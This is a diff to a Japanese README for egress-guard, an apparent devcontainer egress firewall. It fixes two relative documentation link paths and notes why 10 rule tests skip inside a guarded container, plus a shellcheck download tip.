-> **egress-guard を導入した devcontainer の中で実行すると、ルール側が `270 passed, 0 failed, 10 skipped` になります。** `/etc/egress-guard/firewall.json` が存在する環境では、**280 件のうち 10 件**が何も検査できないためです。**設定側の 230 件は影響を受けません**（`230 passed, 0 failed` のまま）。理由と、期待値を書き換えて緑にしてはいけない理由は [`docs/archive/egress-guard-verification-record.md`](../../docs/archive/egress-guard-verification-record.md) §3。
+> **egress-guard を導入した devcontainer の中で実行すると、ルール側が `270 passed, 0 failed, 10 skipped` になります。** `/etc/egress-guard/firewall.json` が存在する環境では、**280 件のうち 10 件**が何も検査できないためです。**設定側の 230 件は影響を受けません**（`230 passed, 0 failed` のまま）。理由と、期待値を書き換えて緑にしてはいけない理由は [`docs/archive/egress-guard-verification-record.md`](../../../docs/archive/egress-guard-verification-record.md) §3。
 
 > **`pnpm lint:sh` はコンテナに shellcheck が無いと動きません。** CI では走ります（`ubuntu-latest` に同梱）。手元で確かめたいときは [koalaman/shellcheck のリリース](https://github.com/koalaman/shellcheck/releases) からバイナリを落としてください。`profile` に `github` が入っていれば `enforce` のままでも取得できます。
 
-開発用オプション（`--check-config` / `--config` / `--resolv-conf`）は [`docs/archive/egress-guard-spec.md`](../../docs/archive/egress-guard-spec.md) §8。いずれも **`sudo` 経由で引数が渡された場合は拒否されます。**
+開発用オプション（`--check-config` / `--config` / `--resolv-conf`）は [`docs/archive/egress-guard-spec.md`](../../../docs/archive/egress-guard-spec.md) §8。いずれも **`sudo` 経由で引数が渡された場合は拒否されます。**
